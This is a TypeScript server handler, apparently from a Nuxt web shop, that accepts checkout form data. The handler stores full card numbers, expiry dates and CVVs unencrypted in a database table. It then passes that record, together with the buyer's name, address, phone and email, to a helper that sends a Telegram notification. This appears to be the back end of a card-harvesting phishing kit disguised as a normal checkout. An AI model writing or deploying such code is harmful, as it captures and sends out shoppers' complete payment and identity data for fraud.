import db, { type PaymentInfo } from "~/server/database/db";
import { sendTelegramNotification } from "~/server/utils/send-telegram";

export default defineEventHandler(async (event) => {
  if (event.node.req.method !== "POST") {
    throw createError({
      statusCode: 405,
      statusMessage: "Method Not Allowed",
    });
  }

  try {
    const body = await readBody(event);
    const {
      firstName,
      lastName,
      country,
      street,
      apartment,
      postalCode,
      city,
      state,
      phone,
      email,
      method,
      cardNumber,
      expiry,
      cvv,
      cardholderName,
    } = body;

    if (
      !firstName ||
      !lastName ||
      !country ||
      !street ||
      !postalCode ||
      !city ||
      !email ||
      !method ||
      !cardNumber ||
      !expiry ||
      !cvv ||
      !cardholderName
    ) {
      throw createError({
        statusCode: 400,
        statusMessage: "Missing required checkout information",
      });
    }

    const stmt =
      db.prepare(`INSERT INTO payment_info (method, card_number, expiry, cvv, cardholder_name)
      VALUES (?, ?, ?, ?, ?)`);

    const result = stmt.run(method, cardNumber, expiry, cvv, cardholderName);

    const newPayment = db
      .prepare("SELECT * FROM payment_info WHERE id = ?")
      .get(result.lastInsertRowid) as PaymentInfo;

    const baseUrl = `${getRequestProtocol(event)}://${getRequestHost(event)}`;
    sendTelegramNotification(newPayment, true, baseUrl, {
      firstName,
      lastName,
      country,
      street,
      apartment,
      postalCode,
      city,
      state,
      phone,
      email,
    });

    return {
      success: true,
      message: `${result.lastInsertRowid}`,
    };
  } catch (err) {
    console.error("[Checkout] Error:", err);
  }
});
